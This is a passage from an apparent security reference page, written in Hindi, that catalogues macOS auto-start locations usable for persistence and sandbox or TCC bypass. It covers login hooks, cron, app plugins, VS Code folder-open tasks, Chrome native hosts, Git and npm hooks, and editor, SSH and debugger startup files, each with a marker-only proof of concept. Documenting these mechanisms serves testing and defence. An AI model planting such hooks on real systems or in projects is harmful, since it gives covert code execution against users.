> यह मेरे लिए काम नहीं किया—न user LoginHook के साथ, न root LogoutHook के साथ

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- आपको `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` जैसा कुछ execute करने में सक्षम होना होगा
  - `~/Library/Preferences/com.apple.loginwindow.plist` में स्थित है

ये deprecated हैं, लेकिन user के login करने पर commands execute करने के लिए उपयोग किए जा सकते हैं।<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

यह सेटिंग `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में संग्रहीत होती है.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

इसे हटाने के लिए:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root user वाला यहाँ stored है: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगी, जिनसे आप **किसी फ़ाइल में लिखकर** और **बहुत आम न होने वाली स्थितियों**—जैसे कुछ खास **programs का installed होना, उपयोगकर्ता की "असामान्य" कार्रवाइयाँ** या environments—की उम्मीद करके आसानी से कुछ execute कर सकते हैं।

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - हालाँकि, आपके लिए `crontab` binary execute कर पाना ज़रूरी है
  - या आपके पास root access होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - सीधे write access के लिए root access ज़रूरी है। अगर आप `crontab <file>` execute कर सकते हैं, तो root access ज़रूरी नहीं है
  - **Trigger**: installed crontab में दिया गया schedule। `at` और `periodic` नीचे अलग mechanisms के रूप में दिए गए हैं।

#### Description & Exploitation

इस command से **current user** के cron jobs की सूची देखें:

```bash
crontab -l
```

system cron daemon के launchd plist में `/usr/lib/cron/tabs` के लिए `QueueDirectories` entry है; installed user crontabs यहीं रखे जाते हैं। दूसरे users के crontabs देखने के लिए root access चाहिए:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

एक disposable account में, केवल marker वाला user cron entry `crontab` से इंस्टॉल किया जा सकता है और उसे देखने के बाद हटाया जा सकता है। `crontab <file>` चलाने से **account का पूरा मौजूदा crontab बदल जाता है**, इसलिए अगर account disposable नहीं है, तो उसे सेव करके बाद में restore करें:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 को पहले से TCC permissions मिली हुई थीं

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **ट्रिगर**: उस फ़ोल्डर में मौजूद एक योग्य Python API script के साथ iTerm2 शुरू करें
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **ट्रिगर**: iTerm2 शुरू करें; AppleScript startup hook का दस्तावेज़ अलग से दिया गया है
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **ट्रिगर**: ऐसा profile चुनकर session बनाएँ जिसका command या initial text payload को invoke करता हो

#### विवरण और Exploitation

[iTerm2 की मौजूदा Python API guide](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) `~/Library/Application Support/iTerm2/Scripts/AutoLaunch` में auto-run **Python** scripts का दस्तावेज़ देती है। यह प्रमाणित नहीं करती कि उस फ़ोल्डर में मौजूद कोई भी executable `.sh` फ़ाइल चलती है। एक अस्थायी account के लिए, इसे `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py` के रूप में सेव करें:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[वर्तमान iTerm2 AppleScript गाइड](https://iterm2.com/documentation-scripting.html) में `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt` को अलग से दस्तावेज़ित किया गया है। आधुनिक फ़ोल्डर मौजूद न होने पर पुराने `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` का विकल्प इस्तेमाल होता है। केवल marker वाला AppleScript यह है:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

इन script उदाहरणों को iTerm2 के दस्तावेज़ों के आधार पर जाँचा गया था; इन्हें सक्रिय desktop session में नहीं चलाया गया। एक disposable account में परीक्षण करने के बाद, क्रमशः test script और `/tmp/ht-iterm-autolaunch-marker` या `/tmp/iterm2-autolaunchscpt` हटा दें।

**`~/Library/Preferences/com.googlecode.iterm2.plist`** में स्थित iTerm2 preferences में profile command या initial text निर्दिष्ट किया जा सकता है। initial text किसी session में टाइप किया जाता है; इसका execution इस बात पर निर्भर करता है कि कोई shell इसकी व्याख्या करता है या नहीं। [iTerm2 का profile documentation](https://iterm2.com/documentation-preferences-profiles-general.html) उस command का वर्णन करता है जो उस profile के साथ नया session बनने पर चलाया जाता है।

यह setting iTerm2 settings में configure की जा सकती है:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

और command preferences में दिखाई देता है:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

सुरक्षित आकलन के लिए, iTerm2 settings में चुनी गई profile देखें या उसकी preference file की कॉपी पढ़ें। किसी live profile में `Initial Text` बदलने से उपयोगकर्ता के sessions प्रभावित होंगे, इसलिए research Mac पर कोई preference नहीं बदली गई।

### xbar

लेख: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन xbar इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Accessibility permissions का अनुरोध करता है

#### स्थान

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **ट्रिगर**: xbar के चलाए जाने पर

#### विवरण

यदि लोकप्रिय प्रोग्राम [**xbar**](https://github.com/matryer/xbar) इंस्टॉल है, तो **`~/Library/Application\ Support/xbar/plugins/`** में एक shell script लिखना संभव है, जो xbar शुरू होने पर execute होगी:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Hammerspoon इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Accessibility permissions मांगता है

#### स्थान

- **`~/.hammerspoon/init.lua`**
  - **ट्रिगर**: Hammerspoon के चलाए जाने पर

#### विवरण

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) **macOS** के लिए एक automation platform है, जो अपने कामकाज के लिए **LUA scripting language** का उपयोग करता है। खास बात यह है कि यह पूरे AppleScript code के integration और shell scripts के execution का समर्थन करता है, जिससे इसकी scripting capabilities काफी बढ़ जाती हैं।<sup>[[13]](#references)</sup>

ऐप एक ही file, `~/.hammerspoon/init.lua`, खोजता है और शुरू होने पर script execute होती है।

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन BetterTouchTool इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Automation-Shortcuts और Accessibility permissions का अनुरोध करता है

#### Location

- एक script file जिसे enabled BetterTouchTool preset में **पहले से reference किया गया हो**, या उस preset का configuration `~/Library/Application Support/BetterTouchTool/` के अंतर्गत हो। सटीक script path इस पर निर्भर करता है कि preset को कैसे configure किया गया था।

[BetterTouchTool's action reference](https://docs.folivora.ai/docs/actions/action-definitions/) में shell-script और background-command actions का दस्तावेज़ दिया गया है। संबंधित preset के active रहने के दौरान configure किया गया keyboard, mouse, touch, widget या कोई अन्य event होना चाहिए; [इसकी trigger guide](https://docs.folivora.ai/docs/configuration/new-trigger/) इस pairing को दिखाती है। Application-support directory में मौजूद कोई random file trigger नहीं होती। पहले से configured action, जो किसी बाहरी writable script को load करता है, write-to-execution का अधिक सीमित target है। Code, BetterTouchTool user के account के रूप में, macOS grants के अधीन चलता है। शोध वाले Mac पर BetterTouchTool `/Applications` में मौजूद नहीं था, इसलिए स्थानीय रूप से कोई preset बदला या execute नहीं किया गया।

### Alfred

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Alfred इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - यह Automation, Accessibility और यहां तक कि Full-Disk access permissions का अनुरोध करता है

#### Location

- एक script या file जिसे installed Alfred workflow में **पहले से reference किया गया हो**, या उपयोगकर्ता की configured `Alfred.alfredpreferences` directory के अंदर वह workflow। Preferences directory sync हो सकती है और इसका कोई स्थिर universal path नहीं है।

[Alfred's workflow guide](https://www.alfredapp.com/help/workflows/) में Powerpack की prerequisite और इसके UI के माध्यम से installation का वर्णन है। Installed workflow का hotkey, keyword या कोई अन्य configured trigger fire होना चाहिए; [Alfred's hotkey example](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) एक script action दिखाता है। [Alfred's environment reference](https://www.alfredapp.com/help/workflows/script-environment-variables/) चुने गए preferences path को `alfred_preferences` के रूप में उपलब्ध कराता है। किसी arbitrary directory में unregistered workflow file डालने से यह साबित नहीं होता कि वह install या run होगा। Code, signed-in Alfred user के रूप में, उसके वास्तविक macOS grants के अधीन चलता है। शोध वाले Mac पर Alfred `/Applications` में मौजूद नहीं था, इसलिए इस path का आकलन केवल documentation के आधार पर किया गया।

### Raycast Script Commands और extension refresh

- **Write target:** ऐसी directory में मौजूद executable script जिसे Raycast Settings → Script Commands के अंतर्गत **पहले से जोड़ा गया हो**। Raycast किसी मनमाने ढंग से नई बनाई गई directory को scan नहीं करता। [Raycast's Script Commands guide](https://manual.raycast.com/script-commands) directory registration का दस्तावेज़ देता है।
- **Trigger और identity:** कोई user indexed command invoke करता है, configured hotkey या fallback इसे invoke करता है, या Raycast किसी `inline` script को उसके configured `@raycast.refreshTime` पर refresh करता है। Script, signed-in Raycast user के रूप में उसके interpreter के ज़रिए चलता है। [upstream metadata reference](https://github.com/raycast/script-commands#metadata) automatic refresh को केवल inline commands तक सीमित करता है, और [Raycast's extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) installed `no-view` या `menu-bar` extension commands के लिए अलग से `interval` का समर्थन करता है। केवल एक सामान्य script command जोड़ने से यह schedule नहीं होता।

Registered script directory वाले disposable account के लिए, केवल marker लिखने वाला inline script यह है:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

इसे registered directory में save करें, executable बनाएँ, और Raycast को refresh करने दें। फिर उस file और `/tmp/ht-raycast-refresh-marker` को हटा दें। Research Mac पर Raycast अपने सामान्य `/Applications` नाम के अंतर्गत नहीं मिला, इसलिए यह documentation-backed है और स्थानीय रूप से नहीं चलाया गया। Accessibility, Automation और file grants अब भी macOS permission prompts के अधीन हैं।

### Visual Studio Code के automatic workspace tasks

- **लिखने का लक्ष्य:** उस workspace के भीतर `.vscode/tasks.json`, जिसे user खोलेगा।
- **ट्रिगर:** VS Code में उस workspace को खोलना, लेकिन केवल तभी जब folder trusted हो **और** automatic tasks की अनुमति दी गई हो। Untrusted workspace में automatic tasks कभी नहीं चलते; default setting, पहली automatic run से पहले user से अनुमति माँगती है। [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) और [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) इन दोनों शर्तों का वर्णन करते हैं।
- **Execution identity:** VS Code user का account, configured task process के ज़रिए। यह application-specific execution है, login persistence नहीं।

**नए, disposable workspace** में, यह केवल marker बनाने वाला task `.vscode/tasks.json` में रखें:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

विश्वसनीय workspace खोलने और automatic tasks की अनुमति देने के बाद, `.autostart-task-ran` की जाँच करें। सफ़ाई के लिए task entry और marker हटाएँ। **Microsoft के documentation और installed VS Code 1.139.1 bundle के आधार पर इसकी पुष्टि की गई थी; इसे active desktop session में नहीं चलाया गया था।**

### Chrome native messaging hosts

- **लिखने का target:** मौजूदा user के लिए `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`, या सभी users के लिए `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` (लिखने के लिए admin access आवश्यक है)। Chromium और Chrome for Testing अलग-अलग directories का उपयोग करते हैं; [Chrome की मौजूदा path table](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location) देखें।
- **Trigger:** `nativeMessaging` permission वाला installed Chrome extension, manifest में दिए गए सटीक host name का उपयोग करके `chrome.runtime.connectNative()` या `chrome.runtime.sendNativeMessage()` call करता है। इसके बाद Chrome host executable शुरू करता है। केवल Chrome खोलने से कोई मनमाना नया native host execute नहीं होता; किसी calling extension के बिना manifest बनाने से कुछ नहीं होता। [Chrome की native messaging guide](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) इस handshake का विवरण देती है।
- **Execution identity:** Chrome user का account। Manifest में executable का absolute path होना चाहिए और calling extension origin को स्पष्ट रूप से अनुमति देनी चाहिए।

Test extension वाले disposable browser account में, नीचे दी गई files की जोड़ी write-to-execution link दर्शाती है। Manifest का filename उसके `name` से मेल खाना चाहिए, और `TEST_EXTENSION_ID` को उस extension की वास्तविक ID से बदलना होगा:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

इस JSON को `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json` के रूप में सेव करें। manifest के `path` पर मौजूद केवल-marker executable में यह हो सकता है:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

टेस्ट extension अपने service worker या extension page से `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` कॉल करने के बाद marker यह साबित करता है कि host शुरू हुआ। यह न्यूनतम host Chrome के length-prefixed response protocol को लागू नहीं करता, इसलिए marker लिखे जाने के बाद extension messaging error रिपोर्ट कर सकता है। सफ़ाई के लिए टेस्ट manifest, host और marker हटाएँ। macOS 26.5.2 पर Chrome app और दोनों manifest directories मौजूद थीं; **active Chrome profile में कोई बदलाव नहीं किया गया और न ही उसका उपयोग किया गया**।

### Karabiner-Elements की key-event commands

- **लिखने का लक्ष्य:** उस account में `~/.config/karabiner/karabiner.json`, जहाँ Karabiner-Elements installed और running हो। [Karabiner की file-location guide](https://karabiner-elements.pqrs.org/docs/json/location/) के अनुसार, app इस file को देखता है और इसमें बदलाव के बाद इसे reload करता है। `assets/complex_modifications` में मौजूद JSON files केवल import किए जा सकने वाले presets हैं; वहाँ केवल file लिखने से कोई rule enable नहीं होता।
- **Trigger:** Rule active होने के बाद configured key event। [`to.shell_command` reference](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) command execution के बारे में बताता है। यह login पर या हर file write पर code execution नहीं है।
- **Execution identity:** वह signed-in user जो Karabiner का user process चला रहा है। इसकी अपनी permission grants और कोई भी TCC access, app और version पर निर्भर करते हैं।

एक disposable test account के लिए, बाकी profile को जस का तस रखते हुए, `karabiner.json` में चुने गए profile के `complex_modifications.rules` array में यह rule object जोड़ें। एक harmless marker बनाने के लिए F18 दबाएँ, फिर यह rule और marker हटा दें। F18 चुनने से सामान्य typing key बदलने से बचा जा सकता है:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

macOS 26.5.2 की test machine पर Karabiner-Elements `/Applications` में installed नहीं था, इसलिए यह local runtime result के बजाय documentation-backed PoC है।

### Local repository में Git hooks

- **Write target:** `<repo>/.git/hooks/post-checkout` जैसा executable hook। यदि `core.hooksPath` पहले से set है, तो उसके बजाय उस configured directory का उपयोग करें। सामान्य tracked source file के रूप में commit किया गया hook clone में अपने-आप install नहीं होता।
- **Trigger:** संबंधित Git operation। उदाहरण के लिए, `post-checkout` `git checkout` या `git switch` के बाद चलता है, और clone या worktree बनाने के बाद भी चल सकता है। [Git का hook reference](https://git-scm.com/docs/githooks) events और executable-bit की requirement बताता है; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) lookup directory बदलता है।
- **Execution identity:** Git चलाने वाला account। Hook तभी execute हो सकता है, जब repository की effective hooks directory actor के लिए writable हो और user बाद में संबंधित Git operation करे।

यह marker-only PoC पूरी तरह disposable repository बनाता है, एक hook install करता है और branch switch करता है। इसे macOS 26.5.2 पर Apple Git 2.50.1 के साथ सफलतापूर्वक execute किया गया था:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### किसी project में npm lifecycle scripts

- **Write target:** किसी writable project के `package.json` में `scripts` map, या किसी installed dependency package का lifecycle script, जिसे user चलाएगा। यह development workflow hook है, directory खोलने पर execution नहीं।
- **Trigger और identity:** बाद में `npm install` या `npm ci` चलाने पर, यदि lifecycle scripts की अनुमति हो, तो `preinstall`, `install` और `postinstall` npm चलाने वाले user के रूप में चलते हैं। सामान्य `npm run <name>` भी मेल खाने वाले `pre<name>` और `post<name>` scripts चलाता है। [npm की lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) में events की सूची है; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) install lifecycle scripts को suppress कर सकता है। Version और policy settings से अनुमति बदल सकती है, इसलिए target npm version जाँचें।

यह marker-only PoC local npm के साथ एक disposable, खाली directory में चलाया गया था। यह dependencies download नहीं करता और user के project में बदलाव नहीं करता:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

यह Python interpreter startup files से अलग है: npm को संबंधित install या run action करना होता है, जबकि Python `site` code किसी सामान्य interpreter invocation पर load हो सकता है। इसी तरह, सामान्य `Makefile` targets और build task definitions के लिए user या पहले से configured tool को उस target को invoke करना पड़ता है; ये अलग OS auto-start paths नहीं हैं।

### Vim startup configuration

- **लिखने का target:** उस user के लिए `~/.vimrc` जो Vim launch करेगा (या Vim के initialization order द्वारा चुनी गई कोई अन्य startup file)। [Vim's startup reference](https://vimhelp.org/starting.txt.html) इस file और `VIMINIT`/`EXINIT` overrides का दस्तावेज़ीकरण करता है।
- **ट्रिगर:** इसके बाद Vim का सामान्य start होना, जिसमें यह configuration load होती है। Vim का `-u NONE` user vimrc को bypass करता है। यह editor-specific execution है, OS login trigger नहीं।
- **Execution identity:** Vim user का account।

निम्न isolated PoC macOS के `/usr/bin/vim` के विरुद्ध चलाया गया था; यह कोई वास्तविक Vim preferences या खुले documents नहीं लिखता:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim का अलग user configuration path `$XDG_CONFIG_HOME/nvim/init.lua` या `init.vim` है, और इसकी [startup documentation](https://neovim.io/doc/user/starting/) के अनुसार यह अपने `plugin/` runtime directories में scripts भी लोड करता है। macOS 26.5.2 वाले test machine पर Neovim इंस्टॉल नहीं था, इसलिए वहाँ इस variant को चलाया नहीं गया।

### SSH client configuration commands

- **लिखने का लक्ष्य:** `~/.ssh/config`, या कोई दूसरी file जिसे यह पहले से include करती हो। यह एक **client** configuration file है; यह नीचे बताए गए server-side `~/.ssh/rc` से अलग है।
- **ट्रिगर:** इससे मेल खाने वाला `ssh` invocation। `Match exec` client द्वारा अपनी configuration का मूल्यांकन करते समय local command चलाता है, यहाँ तक कि `ssh -G` के लिए भी, जो connect किए बिना configuration दिखाता है। `ProxyCommand` तब चलता है जब client किसी मेल खाते connection को सेट up करता है। `LocalCommand` केवल successful connection के बाद चलता है और इसके लिए `PermitLocalCommand yes` आवश्यक है (default `no` है)। इनके timing और prerequisites अलग-अलग हैं; केवल लिखने से ये execute नहीं होते। Upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5) देखें।
- **Execution identity:** `ssh` चलाने वाला local user। मेल खाने वाला host, लागू configuration file और आवश्यक connection होना ज़रूरी है। `ssh -F` से कोई दूसरी configuration file चुनी जा सकती है।

यह marker-only PoC macOS 26.5.2 पर Apple के SSH client के साथ चलाया गया था। `-G` network connection बनाए बिना या user की असली SSH configuration पढ़े बिना `Match exec` को exercise करता है:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger initialization files

- **लिखने का लक्ष्य:** `~/.lldbinit` या उच्च-प्राथमिकता वाली application-specific फ़ाइल, जैसे `~/.lldbinit-lldb`। LLDB debugger शुरू होने पर इनमें से एक फ़ाइल पढ़ता है। डिफ़ॉल्ट रूप से current-directory `.lldbinit` निष्पादित **नहीं** होती; user को `target.load-cwd-lldbinit` सक्षम करना होगा या `--local-lldbinit` पास करना होगा। [LLDB manual](https://lldb.llvm.org/man/lldb.html) देखें।
- **ट्रिगर और पहचान:** User LLDB को `--no-lldbinit` के बिना शुरू करता है; commands उसी user के रूप में चलते हैं। केवल project खोलने का अर्थ यह नहीं है कि उसका `.lldbinit` चलता है।

यह marker-only test macOS 26.5.2 पर LLDB के साथ, एक isolated home और working directory का उपयोग करके चलाया गया था:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [upstream startup documentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) में macOS पर `$HOME/Library/Preferences/gdb/gdbinit` और फिर `~/.gdbinit` का उल्लेख है। मौजूदा डायरेक्टरी की `.gdbinit` फ़ाइल [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html) के अधीन है, और `-nx`/`-nh` initialization files को रोकते हैं। टेस्ट Mac पर GDB इंस्टॉल नहीं था, इसलिए इस वैरिएंट को स्थानीय रूप से नहीं चलाया गया।

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन ssh enabled होना और उसका उपयोग किया जाना ज़रूरी है
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH का उपयोग करके FDA access प्राप्त करें

#### स्थान

- **`~/.ssh/rc`**
  - **ट्रिगर**: ssh के ज़रिए Login
- **`/etc/ssh/sshrc`**
  - Root आवश्यक है
  - **ट्रिगर**: ssh के ज़रिए Login

> [!CAUTION]
> ssh चालू करने के लिए Full Disk Access आवश्यक है:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### विवरण और Exploitation

डिफ़ॉल्ट रूप से, यदि `/etc/ssh/sshd_config` में `PermitUserRC no` सेट नहीं है, तो जब कोई उपयोगकर्ता **SSH के ज़रिए लॉगिन करता है**, स्क्रिप्ट **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** निष्पादित होंगी।<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको args के साथ `osascript` निष्पादित करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **Registered login-item helper app:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (आमतौर पर इस्तेमाल होने वाली bundled location)।
  - **Trigger:** Registration से helper तुरंत शुरू हो सकता है; इसके बाद यह उपयोगकर्ता के अगले logins पर शुरू होता है, approval के अधीन।
- **Registered bundled agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` या `Contents/Library/LaunchDaemons/<name>.plist`।
  - **Trigger:** एक approved agent, registration के समय और बाद के logins पर शुरू हो सकता है; एक approved daemon boot के समय शुरू होता है। Daemon के लिए admin approval आवश्यक है।

#### विवरण

**System Settings → General → Login Items & Extensions** में उपयोगकर्ता login और background items की समीक्षा कर सकते हैं। macOS 13 और उसके बाद के versions, bundled login items, launch agents और launch daemons को register करने के लिए [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) उपलब्ध कराते हैं। इसका [`register()` behavior](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) item के type और approval state के अनुसार अलग-अलग होता है। **किसी helper को app bundle में लिखना, नया login item register करने के लिए पर्याप्त नहीं है।** इसके विपरीत, यदि पहले से registered helper executable writable है, तो उस executable को बदलने से नई registration के बिना उसका अगला launch प्रभावित हो सकता है; पहले वास्तविक path और code-signing checks सत्यापित करें।

Mac पर bundled helpers खोजने का यह read-only तरीका है; इससे उनमें से कोई भी register या launch नहीं होता:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Bundled launch plist के लिए, `BundleProgram` को app bundle root के सापेक्ष resolve करें (उदाहरण के लिए `Contents/MacOS/Helper`), जैसा कि [Apple की Service Management migration guidance](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) में निर्दिष्ट है। Research Mac पर केवल-पढ़ने वाली `/Applications` inventory में 14 bundled helper entries और पाँच `BundleProgram` declarations मिलीं; पाँचों targets resolve हुए और दो user-writability check में पास हुए। यह check **यह साबित नहीं करता** कि कोई helper registered या enabled है, signature validation के बाद executable है, या sandbox से reachable है। इस Mac पर `sfltool dumpbtm` ने 150 नामित records सूचीबद्ध किए; यह निरीक्षण में मदद करने वाला एक साधन है, यह जाँच नहीं कि हर record चल रहा है।

